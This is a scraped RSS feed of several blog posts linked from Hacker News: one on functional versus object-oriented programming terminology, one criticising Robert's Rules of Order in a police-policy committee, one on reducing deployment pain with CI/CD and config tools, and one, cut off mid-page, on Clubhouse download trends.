<h3>This is the first in what will be a two-part series:</h3>



<ol><li><strong>Words Mean Things (this post)</strong></li><li>But actually, how do you choose what to use?</li></ol>




</div></div>
</div></div>
</div></div>



<h3>The Functional/OO debate has, in my view, two big problems.</h3>



<ol><li><strong>The “all or nothing” assumption.</strong> I have a colleague who wants all his code to be functional code, full stop. I also have two former colleagues who swear by, and I quote, “lots of little objects.” I don’t fall into either camp because I think there are better questions than “<em>which of these two tools should I use <strong>always</strong>,” </em>with more insightful answers that have more potential to make us better programmers.</li><li><strong>Absolute terminological butchery.</strong> We have these two terms: “functional” and “object-oriented”, that we use interchangeably with other would-be synonyms, except that they don’t describe the same thing. And what’s with the fact that “functional” is just “functional” and “object” has “-oriented” tacked onto the end? Why isn’t it opposite “function-oriented?” We’re <em>super</em> imprecise about the way we discuss these ideas, and then we make new programmers feel stupid because they cannot picture the leaping triple-axle we <em>obviously meant</em> to perform when what we <em>actually</em> did was slip and fall on the ice. </li></ol>



<div><figure><a href="https://i1.wp.com/chelseatroy.com/wp-content/uploads/2021/02/ice-skate-fail.jpg?ssl=1"><img data-attachment-id="8945" data-permalink="https://chelseatroy.com/2021/02/22/functional-vs-oo-the-debate-that-imprecise-language-destroyed/ice-skate-fail/" data-orig-file="https://i1.wp.com/chelseatroy.com/wp-content/uploads/2021/02/ice-skate-fail.jpg?fit=480%2C360&amp;ssl=1" data-orig-size="480,360" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ice-skate-fail" data-image-description="" data-medium-file="https://i1.wp.com/chelseatroy.com/wp-content/uploads/2021/02/ice-skate-fail.jpg?fit=300%2C225&amp;ssl=1" data-large-file="https://i1.wp.com/chelseatroy.com/wp-content/uploads/2021/02/ice-skate-fail.jpg?fit=480%2C360&amp;ssl=1" loading="lazy" width="480" height="360" src="https://i1.wp.com/chelseatroy.com/wp-content/uploads/2021/02/ice-skate-fail.jpg?resize=480%2C360&amp;ssl=1" alt="" srcset="https://i1.wp.com/chelseatroy.com/wp-content/uploads/2021/02/ice-skate-fail.jpg?w=480&amp;ssl=1 480w, https://i1.wp.com/chelseatroy.com/wp-content/uploads/2021/02/ice-skate-fail.jpg?resize=300%2C225&amp;ssl=1 300w" sizes="(max-width: 480px) 100vw, 480px" data-recalc-dims="1"></a><figcaption>Actual footage of a programming lecture that ends with a SEGFAULT and “well, you all understand the intuition anyway”</figcaption></figure></div>



<p>This grinds my gears to nubbins: the way we teach, instruct, and describe in lazy, platitudinous, imprecise ways, and then suggest that some people just aren’t smart enough to get it. </p>



<h3>So I got angry and tried to fix it. </h3>



<p>Here’s a video explanation. The explanation references Python because I recorded it with my Python students top-of-mind. That said, Python also serves as a useful model language for discussing this topic. </p>



<figure><div>
<p><span><iframe width="723" height="407" src="https://www.youtube.com/embed/HfEM1MKfwFw?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
</div><figcaption>Yes, I made sure it has captions.</figcaption></figure>



<p>If you don’t want to watch me scream and gesticulate while my off-kilter bowtie tragically shortens my neck for the camera, you can see a more language-agnostic version of the point I’m making here in the text below.</p>



<h3 id="So-first-of-all">So first of all</h3>






	
	


<p>Let’s talk about terminology, because there’s a massive lack of precision on this floating around the programming community, and it makes these concepts harder to understand than they have to be.</p>



<h3 id="What-is-a-Paradigm?">What is a Paradigm?</h3>



<p>Let’s talk about two different&nbsp;<strong>paradigms</strong>: different ideas about&nbsp;<strong>how</strong>&nbsp;solving a programming problem can work.</p>



<ol><li><strong>imperative</strong>: describes a way of thinking about a programming problem. Specifically, thinking about a programming problem in terms of how to perform tasks and how to manage state</li><li><strong>declarative</strong>: describes a way of thinking about a programming problem. Specifically, thinking about a programming problem in terms of what&nbsp;<em>output</em>&nbsp;we want, without having to know the details of how we got there.</li></ol>



<p>Different programming languages adopt each of these to different degrees.</p>



<p>For example, in Ruby, when you want to write a web app, you inherit from classes (usually defined by a framework like Rails or Sinatra) that are specifically designed to help you keep track of&nbsp;<em>state</em>&nbsp;(database records, attributes on objects) and&nbsp;<em>behavior</em>&nbsp;(which requests are supposed to route to what actions).</p>



<p>By comparison, in SQL, you write a statement declaring what data you want out of the database and how you want it organized. SQL decides for you how to get the thing you want—whether to use indices, what order to do things in, et cetera—without bothering you to specify that information.</p>



<h3 id="How-do-we-implement-the-paradigms?">How do we implement the paradigms?</h3>



<p><strong>Chiefly, programming languages&nbsp;<em>implement</em>&nbsp;these two paradigms with object-based implementations or function-based implementations</strong>.</p>



<ol><li><strong>object-based</strong>: describes the implementation of a solution in code. Specifically, a solution that depends on the instantiation of, use of, and inheritance from objects.</li><li><strong>function-based</strong>: describes the implementation of a solution in code. Specifically, a solution that depends on the definition of, use of, and passing of functions to functions.</li></ol>



<p>These are not the only ways to implement the paradigms. Huge, common example: SQL is largely not a functional language. You aren’t passing functions around to functions. But it does implement the declarative&nbsp;<em>paradigm</em>. The paradigms and the implementations are not equivalent things.</p>



<h3 id="What-does-&quot;oriented&quot;-mean?">What does “-oriented” mean?</h3>



<p><strong>When a programming language is&nbsp;<em>oriented</em>&nbsp;in a certain direction, it means that the constructs available in that language loan themselves better to one implementation or the other.</strong></p>



<ul><li><strong>object-oriented</strong>: describes a programming language. Specifically, one whose constructs make&nbsp;<strong>object-based</strong>&nbsp;solutions convenient to implement.</li><li><strong>functionally-oriented</strong>: describes a programming language. Specifically, one whose constructs make&nbsp;<strong>function-based</strong>&nbsp;solutions convenient to implement.</li></ul>



<p>Now, it is&nbsp;<em>possible</em>&nbsp;(though kinda difficult) to make a language that&nbsp;<em>only</em>&nbsp;supports&nbsp;<em>one</em>&nbsp;type of solution. Haskell is pretty close to a&nbsp;<strong>functional</strong>&nbsp;language. Alloy is pretty close to an&nbsp;<strong>object</strong>&nbsp;language. However, the utility of a language drops off pretty fast if it&nbsp;<em>only</em>&nbsp;does one or the other because both are at least a&nbsp;<em>little</em>&nbsp;useful in most programming areas. So&nbsp;<strong>-oriented</strong>&nbsp;means “one is more convenient, but you can kinda do both.”</p>



<p>Colloquial terminology butchers this by referring to functionally oriented languages as “functional” and languages that are oriented either way as “multi paradigm” despite the fact that the&nbsp;<em>paradigm</em>&nbsp;is an&nbsp;<em>idea</em>, not an&nbsp;<em>implementation</em>, that a programming language does not have a&nbsp;<em>paradigm</em>, and that a language is <em>X-oriented</em> already denotes that it supports multiple implementation strategies.</p>



<p>(I firmly believe that the reason that this functional vs. OOP idea is so hard for people is that we use the same term to mean six different things, two of which are sometimes opposites.)</p>



<p>I found this chart to provide a visual, but it&nbsp;<em>also</em>&nbsp;butchered the terminology, so I fixed it:</p>



<figure><a href="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?ssl=1"><img data-attachment-id="8927" data-permalink="https://chelseatroy.com/2021/02/22/functional-vs-oo-the-debate-that-imprecise-language-destroyed/functional_vs_oo/" data-orig-file="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?fit=1272%2C838&amp;ssl=1" data-orig-size="1272,838" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="functional_vs_oo" data-image-description="" data-medium-file="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?fit=300%2C198&amp;ssl=1" data-large-file="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?fit=723%2C477&amp;ssl=1" loading="lazy" width="723" height="477" src="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?resize=723%2C477&amp;ssl=1" alt="" srcset="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?resize=1024%2C675&amp;ssl=1 1024w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?resize=300%2C198&amp;ssl=1 300w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?resize=768%2C506&amp;ssl=1 768w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2021/02/functional_vs_oo.png?w=1272&amp;ssl=1 1272w" sizes="(max-width: 723px) 100vw, 723px" data-recalc-dims="1"></a><figcaption>Original image from&nbsp;<a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/dotnet/standard/linq/functional-vs-imperative-programming#:~:text=Functional%20programming%20is%20a%20form,support%20imperative%20(procedural)%20programming." target="_blank">here</a>,&nbsp;but I had to annotate it to fix the terminology.</figcaption></figure>



<h3 id="Python-is-an-object-oriented-language.">Python is an object-oriented language.</h3>



<p>People will argue with me on this point that Python is “in fact, dual-paradigm.” I disagree for reasons that you are now intimately familiar with. Python is object-oriented. You&nbsp;<em>can</em>&nbsp;do functional programming in it. It is designed, however, to prioritize object-based programming. BDFL Guido Van Rossum has said this himself on several occasions (<a href="https://python-history.blogspot.com/2009/04/origins-of-pythons-functional-features.html">here, straight from the horse’s mouth, don’t @ me</a>). So far the core team has not reversed any of the major technical decisions driven by that point of view. </p>



<p>I would also argue that Python is not only <em>not at all unique</em> in its support for multiple paradigms, but also <em>a far cry from the most graceful language</em> at supporting multiple paradigms. This is fine: as I mentioned, the design goals of the language have never included functional support, or even grace in general (<a href="https://chelseatroy.com/2021/01/31/why-learn-python/">see here, we talked about this</a>). But like, when people get on a high horse about this, please don’t be taken in.</p>



<h3>Fine, Chelsea. Anyway, which one should I use?</h3>



<p>Functional programming.</p>



<p>I’m kidding: based on the fact that we just spent a thousand words getting clear on what we’re even <em>talking</em> about, you’d be right to predict that my answer to this question has a lot more nuance than that. Meanwhile, though, I try to keep things pithy and digestible around here. So we’ll call it a night and dig into the “what to use” question in the next post.</p>



<h3>If you liked this piece, you might also like:</h3>



<p><a href="https://chelseatroy.com/2021/01/14/quantifying-technical-debt/">The last time I just absolutely snapped on imprecise terminology in tech</a> (on this occasion about “technical debt”)</p>



<p><a href="https://chelseatroy.com/category/programming/programming-concepts/debugging/">The debugging category</a>&nbsp;(people seem to like this and struggle to find similar content elsewhere)</p>



<p><a href="https://chelseatroy.com/2020/11/30/rubyconf-workshop-analyzing-risk-in-a-software-system/">The risk analysis workshop</a>&nbsp;(4 out of 5 “Jimi Hendrix of [insert programming language here]”s approve!)</p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article><!-- #post-## -->

			
<!-- #comments -->

		
		</main><!-- #main -->
	</section><!-- #primary -->

	<!-- #secondary -->

	</div><!-- #content -->

	<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://chelseatroy.com/2021/02/22/functional-vs-oo-the-debate-that-imprecise-language-destroyed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232049</guid>
            <pubDate>Mon, 22 Feb 2021 23:28:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Robert’s Rules Suck: Why We Can’t Make Change Until We Change the System]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 27 (<a href="https://news.ycombinator.com/item?id=26231837">thread link</a>) | @sep_field
<br/>
February 22, 2021 | https://aninjusticemag.com/roberts-rules-suck-47b689f3c48f | <a href="https://web.archive.org/web/*/https://aninjusticemag.com/roberts-rules-suck-47b689f3c48f">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><h2 id="99a2">Why We Can’t Make Change Until We Change the System</h2><div><div><div><div><a href="https://martywilder-44820.medium.com/?source=post_page-----47b689f3c48f--------------------------------" rel="noopener"><div><p><img alt="Marty Wilder" src="https://miro.medium.com/fit/c/96/96/0*bbAuchMAUj_x330g" width="48" height="48"></p></div></a></div></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Close up of a judge’s gavel on the block" src="https://miro.medium.com/max/19200/1*xqElYYwIds8NChYEdGxH7Q.jpeg" width="9600" height="5304" srcset="https://miro.medium.com/max/552/1*xqElYYwIds8NChYEdGxH7Q.jpeg 276w, https://miro.medium.com/max/1104/1*xqElYYwIds8NChYEdGxH7Q.jpeg 552w, https://miro.medium.com/max/1280/1*xqElYYwIds8NChYEdGxH7Q.jpeg 640w, https://miro.medium.com/max/1400/1*xqElYYwIds8NChYEdGxH7Q.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*xqElYYwIds8NChYEdGxH7Q.jpeg?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@bill_oxford?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener">Bill Oxford</a> on <a href="https://unsplash.com/s/photos/gavel?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener">Unsplash</a></figcaption></figure><h2 id="b772">Taking Action</h2><p id="0a32">I was ready to do more than take a knee or carry a cardboard sign. I felt like it was time for me to move beyond protesting and get involved, somehow, in creating change. That was why I joined an ad hoc committee formed by our city council to address police policy. Think global, act local. At last, I felt hope. I felt like maybe I can make a difference that matters. And then I faced reality, and was shocked by how bad it is.</p><p id="9857">I was not naïve going into this. I fully expected that whatever good policy change our committee was able to craft might be diluted or rejected by the city council in the end, or that the Police Chief might find ways to circumvent them, or that even if enacted, the police union would still allow officers who violate those policies to be exonerated. With that in mind, I stayed focused on the long haul. I wanted to craft strong and demanding policies that could become part of a list of demands to be relentlessly rallied before the city officials until they are adopted. I kept my eye on forming alliances with others on the committee that could grow into lasting coalitions. This committee, to me, was only the beginning.</p><p id="8c03">It looked promising. The city had called on 13 civic organizations representing BIPOC and other marginalized communities. I was there on behalf of a nonprofit that services transgender and gender non-conforming folx. There are 30 members, in all. As we went through brief introductions at the first meeting, I was encouraged. The committee is facilitated by a team of three individuals, including a Black woman who is the Equity &amp; Access Coordinator for the county. She and I conversed at the outset about the challenges of facilitating a group the size of ours over Zoom due to the pandemic. We talked about setting group agreements. We talked about equity over equality and elevating voices that were underprivileged, especially those of women of color. I mentioned the need to give each member enough of a platform to feel seen and recognized at the beginning, even though that would be a big time investment, because it would save time in the long run by deterring potential internal conflicts. I also expressed my opinion that we would need to work in smaller subcommittees in order to be effective.</p><h2 id="b7ce">Thwarted by the System</h2><p id="ff5a">But then we ran into two great obstacles; public meetings law and Robert’s Rules of Order. The first curtailed our ability to network and converse with each other on the committee. The second is an infuriating silencer that obstructs everything I have come to learn about good problem-solving and decision-making. I’ll start with public records law because that is more straightforward. The law states that we must have a quorum, in our case 16 or more, of members present at each meeting. Each meeting must be posted and publicly broadcast in real time. Since we were airing our meeting over Zoom due to the pandemic, the meetings are live streamed and recorded. But because the live stream and recording do not show the chat box, we cannot use that feature to communicate things like consent with what the active speaker is saying, or to ask clarifying questions. It all has to be voiced to be recorded. Furthermore, since only the Zoom hosts can see non-verbal signs, we cannot use the raised hands nor the Yes/No functions built into Zoom. Instead we have to wait the three to four minutes it takes for the host to read off each of the 30 names, wait for the person to unmute, and get a recorded response with a “yes”, “no”, or “abstain” for every motion we attempt to pass. We have yet to do this without someone in the middle asking for the motion to be restated. I don’t think there is anyone involved who is not finding this irritating, but everyone seems resigned to endure it.</p><p id="7e09">The worst aspect of the way the city is interpreting public records law is that they have instructed all of us not to communicate with each other as a group outside of the public meetings. Email correspondence, file sharing, and social media can all become violations of public records law. If there are 16 or more of us involved, or even if there is not a quorum but we are discussing content that affects decision-making, it all needs to be publicly broadcast. While I can understand the reasoning behind these stipulations, where does that leave us? We are 30 members of very diverse parts of our city, we don’t know each other very well, and many of us have never served on a committee like this before. How are we supposed to work together? We have been reduced, effectively, to responding in the moment. We cannot even use file sharing to look at and consider ideas or share resources except by going through the facilitation team.</p><p id="ed4b">The facilitation team has directed us to send all communication to them and they will disperse information to the committee. That would be fine, if it were simply a procedure to go through. But the facilitation team does not simply pass along information. They hold onto it, decide whether or not it is information that should or should not be shared, sometimes rewrite or re-position it, and pack everything into one overwhelming information packet that we receive on Friday night before a Monday meeting. One reason behind this is that all the documentation must also be publicly posted alongside the meeting announcement. It also consolidates things so that committee members do not get bogged down with frequent emails. The danger is in editing out or misconstruing some of our voices, often those that most need to be heard. Also, there is the disabling effect of leaving us inactive and unable to work productively in the two weeks between meetings. I find myself struggling to resist the idea that the facilitation team has an expected outcome for us, and they are guiding the committee to meet their expectations.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="A laptop computer showing a large group of faces of people conferencing on a Zoom call. A coffee mug sits beside the laptop." src="https://miro.medium.com/max/3840/1*RRlLLZmsdfl8gIxEPJTMmg.jpeg" width="1920" height="1440" srcset="https://miro.medium.com/max/552/1*RRlLLZmsdfl8gIxEPJTMmg.jpeg 276w, https://miro.medium.com/max/1104/1*RRlLLZmsdfl8gIxEPJTMmg.jpeg 552w, https://miro.medium.com/max/1280/1*RRlLLZmsdfl8gIxEPJTMmg.jpeg 640w, https://miro.medium.com/max/1400/1*RRlLLZmsdfl8gIxEPJTMmg.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*RRlLLZmsdfl8gIxEPJTMmg.jpeg?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@cwmonty?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener">Chris Montgomery</a> on <a href="https://unsplash.com/s/photos/zoom-meeting?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener">Unsplash</a></figcaption></figure><h2 id="a8e4">Killing the Creativity</h2><p id="4127">Then we come to Robert’s Rules of Order. For those who are not familiar, this is a set of meeting protocols that dates back to before the Civil War. Basically, the facilitator calls on people to speak, one at a time, without interruptions for a given amount of time. In our meetings it is 3 minutes. When someone wants to propose a decision, they make a “motion”. Someone else must second that motion. Then the facilitator calls the vote. The motion, the person who presented it, the person who seconded it and the total numbers of votes: yes, no, and abstain, are all recorded. That’s it in a nutshell.</p><p id="9cee">What is missing from Robert’s Rules of Order is the magic of good problem-solving. There is no room for contained chaos, a free flow of energy, voices, and ideas. I taught engineering design in high schools for ten years. One of the most enjoyable, and innovatively genius, aspects of problem-solving is brainstorming. Brainstorming is meant to be messy. It’s a chance to air everything out and look at it from as many different angles as you can dream up. You start to notice patterns and connections. Someone poses something “crazy” and it piques your interest. Then there is this very important concept called “piling on.” Piling on happens when your idea sparks a new idea in my mind. I share my idea and that, in turn, sparks a new idea for someone else. This phase of problem-solving is divergent and for traditionalists, it goes against every fiber in their “we need to narrow this down” trajectory. But the traditional “narrowing down” linear approach leads to very limited and narrow solutions. Whereas, the creativity and mutual discovery of the brainstorming process culminates in a kind of magical synthesis of ideas and approaches. The team then needs to choose what approach they want to take. It might be evident in a general idea that rises up out of the chaos in a way that is unifying and electrifying, which leads to a much smoother process as you narrow in on the solution. Or you may see two or three different approaches that you either need to choose between as a group, or make a choice to split up and try all of them. Besides being a good way to get fresh and, at times, brilliant ideas, brainstorming also results in better teamwork because everyone was able to contribute fully and feel seen, heard, and involved.</p><p id="5d12">But the public meeting format has no room for that. We can’t even utilize Zoom break-out groups because the public would need to see all of the break-out groups simultaneously. Here is where it becomes de-humanizing to me. There is no place to <em>form</em> ideas in the public meeting. Members are expected to <em>bring</em> ideas, pre-fabricated, and see how they hold up to a vote. I used to function like that, bringing my ideas to the table in a battle for the best articulated argument to slay all others and take the lead. Then I studied feminism. When you value the people and the process, everything changes. It’s no longer a contest to see who has the best idea. It becomes about the whole, all of us together as a group, facing a problem and learning from each other as we go. I don’t want to presume to bring a solution that will address everyone’s needs. I want to hear from others and I want my thoughts to be affected by those stories. I want our collective ideas to <em>become</em> as we meet. What if our government were like that? What if the premise was that no one has the answer going in, but if we all bring our perspectives together and listen to one another, the answer will take form out of the collective whole? I know. It sounds ludicrous given the extreme partisan attacks that happen all the time in our current system. But once you have experienced this kind of collective solution-making even on a small scale; it can make you a believer.</p><h2 id="778c">White Supremacy Playbook</h2><p id="1307">Robert’s Rules of Order and the general meeting protocols really do fall right in line with what we know about white supremacist culture. What I mean by this is that we value this methodology and purport …</p></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aninjusticemag.com/roberts-rules-suck-47b689f3c48f">https://aninjusticemag.com/roberts-rules-suck-47b689f3c48f</a></em></p>]]>
            </description>
            <link>https://aninjusticemag.com/roberts-rules-suck-47b689f3c48f</link>
            <guid isPermaLink="false">hacker-news-small-sites-26231837</guid>
            <pubDate>Mon, 22 Feb 2021 22:59:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ways to Reduce the Pain of Deploys]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26231563">thread link</a>) | @dlevine
<br/>
February 22, 2021 | https://blog.config.ly/post/643856862947721216/ways-to-reduce-the-pain-of-deploys | <a href="https://web.archive.org/web/*/https://blog.config.ly/post/643856862947721216/ways-to-reduce-the-pain-of-deploys">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In our <a href="https://href.li/?http://the-cost-of-pushing-code">last post</a>, we talked about the cost of deploying code. In this post, we are going to talk about ways to reduce the pain of deploys. There are a few different strategies to accomplish this. The first is to use tooling that makes deploys faster and easier. The second is to reduce the weight of deploys. And the third is to remove some things from the deploy cycle altogether. By combining these strategies, you can reduce the pain involved with deploying and speed up your release cycle.<b><br></b></p><h2>Improving deployment tooling</h2><p>There are a number of ways to reduce deployment costs by rolling out improved tooling. Platforms that enable continuous integration (CI) and continuous deployment (CD) can make deploys both easier and much faster. They can automatically run your tests or other verification processes, preventing bad code from being deployed in the first place. When the code is ready to go, it can be deployed automatically. This will also reduce the amount of code that is deployed at a time, allowing you to isolate bad commits and fix them faster.&nbsp;</p><p>A more recent development is continuous verification (CV), which gives you tools that you can use to determine the quality of a new build when it is deployed in production. In some cases, you can deploy a canary build to assess performance and error rates in relation to the stable build. In the case when bad code is deployed, CV tools can let you know of issues that arise and even potentially roll back automatically.</p><p>Platforms such as <a href="https://href.li/?https://circleci.com">CircleCI</a>, <a href="https://href.li/?https://harness.io">Harness</a>, <a href="https://href.li/?https://www.jenkins.io/">Jenkins</a>, and <a href="https://href.li/?https://spinnaker.io/">Spinnaker</a> can all help you to enable CI/CD and even CV.</p><h2>Reducing deployment weight</h2><p>A second way to make deploys less costly is by decreasing deployment weight. This can be accomplished by adopting CI/CD, as it will be possible to deploy smaller updates more frequently. However, another way to do this is by breaking up your application into smaller services that can be verified and deployed independently. This will enable you to deploy smaller pieces of code with a smaller blast radius.</p><p>This is not to say that microservices are a panacea; the Internet is littered with horror stories of microservice migrations that took years and introduced a host of new problems. A lot of companies either don’t put enough work into setting up tooling for microservices, don’t think enough about standards or interoperability, or divide their app into way too many microservices. However, if you think intelligently about how to split up your app and do the migration deliberately and thoughtfully, the result will be a more robust application that is easier to deploy and test.</p><p>There are a number of platforms that can make it easier to split up your app into smaller services. These include <a href="https://href.li/?https://spring.io/projects/spring-boot">Spring Boot</a>, <a href="https://href.li/?https://akka.io/">Akka</a>, <a href="https://href.li/?https://kubernetes.io/">Kubernetes</a>, <a href="https://href.li/?https://www.docker.com/">Docker</a>, <a href="https://href.li/?https://prometheus.io/">Prometheus</a>, and many more.</p><h2>Removing data from the deploy process</h2><p>The final strategy for making deploys less costly is to remove some aspects of your code from the deployment process. When they are starting out, developers often hardcode various things in code, including configuration constants, user-facing text, and even feature toggles. While this is often easiest in the short term and will work when deploys are fast, it becomes progressively more annoying to push code every time you want to change a piece of text. A lot of companies end up solving this with a homegrown solution, which typically involves storing the data in some type of database. This will work, but even then the data isn’t easily accessible to non-coders. You build a UI to allow non-coders to edit the data, but this will require additional work.</p><p>So how do you remove data from the deploy process? The first option is to use a generic config server. This will allow you to update text or constants on the fly, and changes will be reflected in the production application without a deploy. Options for doing something like this are <a href="https://href.li/?https://firebase.google.com/docs/remote-config">Firebase Remote Config</a> and <a href="https://href.li/?https://www.config.ly/">Configly</a>.</p><p>If you want a tool more suited to specific applications, you can find tools that are suited to almost any common use case. They will require some upfront work to implement, but will pay for themselves in the longer-term. If you want to internationalize your text and remove it from your code, you can use <a href="https://href.li/?https://simplelocalize.io/">Simplelocalize</a>, <a href="https://href.li/?https://lokalise.com/">Lokalise</a>, or <a href="https://href.li/?https://locize.com/?lng=en">Locize</a>. For feature flagging, consider <a href="https://href.li/?https://launchdarkly.com/">Launch Darkly</a>, <a href="https://href.li/?https://www.split.io/">Split</a>, or <a href="https://href.li/?https://apptimize.com/">Apptimize</a>.</p><p>These are just some of the many ways that you can make your deployments lighter weight and faster. By making deployments easier, you will both reduce frustration and make it easier for your team to move faster.</p></div></div>]]>
            </description>
            <link>https://blog.config.ly/post/643856862947721216/ways-to-reduce-the-pain-of-deploys</link>
            <guid isPermaLink="false">hacker-news-small-sites-26231563</guid>
            <pubDate>Mon, 22 Feb 2021 22:31:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Clubhouse Fading Out?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26231469">thread link</a>) | @rats
<br/>
February 22, 2021 | https://zandrey.com/why-clubhouse-is-fading-out/ | <a href="https://web.archive.org/web/*/https://zandrey.com/why-clubhouse-is-fading-out/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Everyone is talking about Clubhouse, and how it's going to be the "next big thing", and <a href="https://www.theinformation.com/articles/clubhouse-gets-investment-interest-at-1-billion-valuation">at $1B valuation</a>, it's big enough already. Here's a few excerpts from popular media just from the last week:</p><blockquote>The 11-month-old app has exploded in popularity, even as it grapples with harassment, misinformation and privacy issues.</blockquote><p>via <a href="https://www.nytimes.com/2021/02/15/business/clubhouse.html">NYTimes</a></p><blockquote>Based on data from research firm <a href="https://www.appannie.com/en/insights/mobile-minute/clubhouse-social-audio-apps-rise/" rel="noreferrer noopener">App Annie</a> (via <em><a href="https://techcrunch.com/2021/02/18/report-social-audio-app-clubhouse-has-topped-8-million-global-downloads/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS5ici8&amp;guce_referrer_sig=AQAAAKUfSS5gvGbTxlFn70ZTwbLGJirYiJsw1svnueP07i2LS8PUilqtOCfuw-kvv9HXD-9II2Dt8Xo3gubw__3jumv7_HUdzEvr-06l-rWLvhuN7zMC6PRmP-cA6bNUrBMd-reyouT5FJ7ZFVrQBv86XPSFViPAYUQXxkk0oPLwQ5st" rel="noreferrer noopener">TechCrunch</a></em>), the Clubhouse app reached 8.1 million global downloads on the iOS App Store on February 16, 2021. Just for comparison, the app had registered 3.5 million downloads by February 1, 2021. The research reveals that the app has become extremely popular in the UK, Germany, Japan, Brazil, and Turkey.</blockquote><p>via <a href="https://9to5mac.com/2021/02/18/clubhouse-reaches-8-million-downloads-on-the-ios-app-store/">9to5mac</a> </p><p>They even have a hockey stick graph to back this up:</p><figure><img src="https://zandrey.com/content/images/2021/02/image.png" alt="" srcset="https://zandrey.com/content/images/size/w600/2021/02/image.png 600w, https://zandrey.com/content/images/size/w1000/2021/02/image.png 1000w, https://zandrey.com/content/images/2021/02/image.png 1024w"></figure><p>But let's look closer.</p><p>Here's the number of downloads <strong>globally</strong>. There is a peak at ~500K daily downloads (Feb, 15) and a downward trend afterward. </p><figure><img src="https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-1.54.14-PM.png" alt="" srcset="https://zandrey.com/content/images/size/w600/2021/02/Screen-Shot-2021-02-22-at-1.54.14-PM.png 600w, https://zandrey.com/content/images/size/w1000/2021/02/Screen-Shot-2021-02-22-at-1.54.14-PM.png 1000w, https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-1.54.14-PM.png 1416w" sizes="(min-width: 1200px) 1200px"></figure><p>US is pretty stable at around 3M total downloads and 45K daily. A bit surprising because of all the hype and celebrities onboarding the app every day, and US being the largest iPhone user base in the world (except China of course) I would expect at &nbsp;least a certain amount of upward trend here.</p><figure><img src="https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-1.58.10-PM.png" alt="" srcset="https://zandrey.com/content/images/size/w600/2021/02/Screen-Shot-2021-02-22-at-1.58.10-PM.png 600w, https://zandrey.com/content/images/size/w1000/2021/02/Screen-Shot-2021-02-22-at-1.58.10-PM.png 1000w, https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-1.58.10-PM.png 1415w" sizes="(min-width: 1200px) 1200px"></figure><p>Let's look at other countries and here is where it gets interesting. Brazil:</p><figure><img src="https://zandrey.com/content/images/2021/02/Screen-Shot-2021-02-22-at-2.02.41-PM.png" alt="" srcset="https://zandrey.com/content/images/size/w600/2021/02/Screen-Shot-2021-02-22-at-2.02.41-PM.png 600w, 